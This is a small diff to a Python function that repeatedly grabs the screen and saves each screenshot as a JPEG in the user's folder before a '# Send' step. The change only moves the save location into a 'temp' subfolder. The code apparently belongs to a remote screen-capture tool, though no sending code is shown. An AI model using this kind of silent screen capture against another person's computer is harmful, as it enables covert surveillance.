@@ -39,7 +39,7 @@ def snap_handler(userid):
 			log('killSnap, breaking')
 			return
 		snapshot = ImageGrab.grab() # TODO Lower quality
-		save_path = "C:\\Users\\" + getpass.getuser() + "\\snapshots\\MySnapshot_{0}.jpg".format(random.randint(0,99999))
+		save_path = "C:\\Users\\" + getpass.getuser() + "\\snapshots\\temp\\MySnapshot_{0}.jpg".format(random.randint(0,99999))
 		snapshot.save(save_path)
 		#log('got snap, snapid: ' + str(snapid))
 		# Send
